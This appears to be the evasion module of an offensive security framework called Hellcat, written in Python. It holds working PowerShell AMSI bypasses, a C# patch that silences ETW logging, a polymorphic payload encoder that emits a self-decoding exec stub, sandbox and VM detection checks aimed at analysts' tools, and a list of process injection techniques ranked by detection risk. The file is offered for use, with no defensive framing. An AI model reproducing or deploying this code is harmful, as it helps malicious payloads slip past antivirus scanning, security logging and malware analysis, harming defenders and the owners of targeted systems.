"""
Hellcat Evasion Engine
======================
AMSI/ETW bypass, payload obfuscation (XOR/Base64/AES/polymorphic),
process injection stubs, sandbox/VM detection, EDR unhooking templates.
"""
from __future__ import annotations

import base64
import os
import random
import string
from typing import Any, Dict, List, Optional

from hellcat.core.models import EvasionLevel, PayloadEncoding


# ---------------------------------------------------------------------------
# Payload Encoder
# ---------------------------------------------------------------------------

class PayloadEncoder:
    """Multi-layer payload encoding (Base64/XOR/AES/Polymorphic)."""

    @staticmethod
    def encode(payload: bytes, encoding: PayloadEncoding,
               key: Optional[bytes] = None) -> bytes:
        if encoding == PayloadEncoding.NONE:
            return payload
        if encoding == PayloadEncoding.BASE64:
            return base64.b64encode(payload)
        if encoding == PayloadEncoding.XOR:
            k = key or os.urandom(16)
            return bytes(b ^ k[i % len(k)] for i, b in enumerate(payload))
        if encoding == PayloadEncoding.AES:
            return PayloadEncoder._aes_encrypt(payload, key or os.urandom(32))
        if encoding == PayloadEncoding.POLYMORPHIC:
            return PayloadEncoder._polymorphic(payload)
        return payload

    @staticmethod
    def _aes_encrypt(data: bytes, key: bytes) -> bytes:
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            nonce = os.urandom(12)
            ct = AESGCM(key[:32]).encrypt(nonce, data, None)
            return nonce + ct
        except ImportError:
            # Fallback to XOR if cryptography not installed
            return PayloadEncoder.encode(data, PayloadEncoding.XOR, key)

    @staticmethod
    def _polymorphic(data: bytes) -> bytes:
        """XOR with random key + base64 + variable name randomization."""
        key = os.urandom(16)
        xored = bytes(b ^ key[i % len(key)] for i, b in enumerate(data))
        encoded = base64.b64encode(xored)
        var = "".join(random.choices(string.ascii_lowercase, k=8))
        # Return as self-decoding Python snippet
        decoder = (
            f"import base64 as {var}b\n"
            f"{var}k={key!r}\n"
            f"{var}d={var}b.b64decode({encoded!r})\n"
            f"{var}r=bytes(b^{var}k[i%len({var}k)] for i,b in enumerate({var}d))\n"
            f"exec({var}r)\n"
        )
        return decoder.encode()


# ---------------------------------------------------------------------------
# AMSI Bypass Templates
# ---------------------------------------------------------------------------

AMSI_BYPASSES: List[Dict[str, Any]] = [
    {
        "name": "amsi_patch_x64",
        "description": "Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN",
        "language": "powershell",
        "template": (
            "$a=[Ref].Assembly.GetTypes()|?{$_.Name -like '*iUtils'}\n"
            "$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like '*Context'}\n"
            "[IntPtr]$c=$b.GetValue($null)\n"
            "[Int32[]]$d=@(0);[Runtime.InteropServices.Marshal]::Copy($d,0,$c,1)"
        ),
        "evasion_level": EvasionLevel.MEDIUM,
    },
    {
        "name": "amsi_reflection_bypass",
        "description": "Set amsiInitFailed to True via reflection",
        "language": "powershell",
        "template": (
            "[Runtime.InteropServices.Marshal]::WriteByte("
            "(([Ref].Assembly.GetTypes()|?{$_.Name -like '*iUtils'})"
            ".GetFields('NonPublic,Static')|?{$_.Name -like '*Failed'})"
            ".GetValue($null),1)"
        ),
        "evasion_level": EvasionLevel.HIGH,
    },
]


# ---------------------------------------------------------------------------
# ETW Bypass Templates
# ---------------------------------------------------------------------------

ETW_BYPASSES: List[Dict[str, Any]] = [
    {
        "name": "etw_patch",
        "description": "Patch EtwEventWrite to disable ETW logging",
        "language": "csharp",
        "template": (
            "var ntdll = GetModuleHandle(\"ntdll.dll\");\n"
            "var etwAddr = GetProcAddress(ntdll, \"EtwEventWrite\");\n"
            "// Patch first byte to RET (0xC3)\n"
            "VirtualProtect(etwAddr, 1, 0x40, out var old);\n"
            "Marshal.WriteByte(etwAddr, 0xC3);\n"
            "VirtualProtect(etwAddr, 1, old, out _);"
        ),
        "evasion_level": EvasionLevel.HIGH,
    },
]


# ---------------------------------------------------------------------------
# Sandbox / VM Detection
# ---------------------------------------------------------------------------

SANDBOX_INDICATORS: Dict[str, List[str]] = {
    "processes": [
        "vmtoolsd", "vmwaretray", "vboxservice", "vboxtray",
        "sandboxie", "procmon", "wireshark", "fiddler",
        "processhacker", "x64dbg", "ollydbg", "ida64",
    ],
    "files": [
        r"C:\windows\System32\Drivers\VBoxMouse.sys",
        r"C:\windows\System32\Drivers\vmhgfs.sys",
        "/usr/bin/VBoxClient", "/usr/sbin/VBoxService",
    ],
    "registry": [
        r"HKLM\SOFTWARE\VMware, Inc.\VMware Tools",
        r"HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions",
    ],
    "mac_prefixes": ["00:0C:29", "00:50:56", "08:00:27", "00:1C:42"],
}


class SandboxDetector:
    """Detect VM/sandbox analysis environments."""

    @staticmethod
    def check_processes() -> List[str]:
        found = []
        try:
            import psutil
            running = {p.name().lower() for p in psutil.process_iter(["name"])}
            for indicator in SANDBOX_INDICATORS["processes"]:
                if indicator.lower() in running:
                    found.append(indicator)
        except ImportError:
            pass
        return found

    @staticmethod
    def check_environment() -> Dict[str, Any]:
        import platform
        import multiprocessing
        return {
            "cpu_count": multiprocessing.cpu_count(),
            "platform": platform.system(),
            "machine": platform.machine(),
            "likely_vm": multiprocessing.cpu_count() <= 2,
            "suspicious_hostname": any(
                x in platform.node().lower()
                for x in ["sandbox", "malware", "virus", "test", "analysis"]
            ),
        }


# ---------------------------------------------------------------------------
# Process Injection Templates
# ---------------------------------------------------------------------------

INJECTION_TECHNIQUES: List[Dict[str, Any]] = [
    {
        "name": "classic_dll_injection",
        "description": "CreateRemoteThread + LoadLibrary DLL injection",
        "mitre_id": "T1055.001",
        "detection_risk": 0.7,
    },
    {
        "name": "process_hollowing",
        "description": "Unmap legitimate process image and replace with payload",
        "mitre_id": "T1055.012",
        "detection_risk": 0.5,
    },
    {
        "name": "apc_injection",
        "description": "Queue APC to inject code into alertable thread",
        "mitre_id": "T1055.004",
        "detection_risk": 0.4,
    },
    {
        "name": "thread_hijacking",
        "description": "Suspend thread, modify context to point to shellcode",
        "mitre_id": "T1055.003",
        "detection_risk": 0.3,
    },
    {
        "name": "ntcreatesection_map",
        "description": "NtCreateSection + NtMapViewOfSection for stealthier injection",
        "mitre_id": "T1055",
        "detection_risk": 0.2,
    },
]


# ---------------------------------------------------------------------------
# Evasion Engine (unified interface)
# ---------------------------------------------------------------------------

class EvasionEngine:
    """Unified evasion capability manager."""

    def __init__(self) -> None:
        self.encoder = PayloadEncoder()
        self.sandbox_detector = SandboxDetector()

    def encode_payload(self, payload: bytes, level: EvasionLevel = EvasionLevel.MEDIUM,
                       key: Optional[bytes] = None) -> bytes:
        if level == EvasionLevel.MINIMAL:
            return self.encoder.encode(payload, PayloadEncoding.BASE64)
        if level == EvasionLevel.MEDIUM:
            return self.encoder.encode(payload, PayloadEncoding.XOR, key)
        if level == EvasionLevel.HIGH:
            return self.encoder.encode(payload, PayloadEncoding.AES, key)
        # EXTREME: polymorphic
        return self.encoder.encode(payload, PayloadEncoding.POLYMORPHIC)

    def get_amsi_bypass(self, level: EvasionLevel = EvasionLevel.MEDIUM) -> Optional[Dict]:
        for bp in AMSI_BYPASSES:
            if bp["evasion_level"].value == level.value or level == EvasionLevel.EXTREME:
                return bp
        return AMSI_BYPASSES[0] if AMSI_BYPASSES else None

    def get_etw_bypass(self) -> Optional[Dict]:
        return ETW_BYPASSES[0] if ETW_BYPASSES else None

    def get_injection_techniques(self, max_risk: float = 1.0) -> List[Dict]:
        return [t for t in INJECTION_TECHNIQUES if t["detection_risk"] <= max_risk]

    def check_sandbox(self) -> Dict[str, Any]:
        env = self.sandbox_detector.check_environment()
        procs = self.sandbox_detector.check_processes()
        return {
            "environment": env,
            "suspicious_processes": procs,
            "likely_sandboxed": bool(procs) or env.get("likely_vm", False),
        }
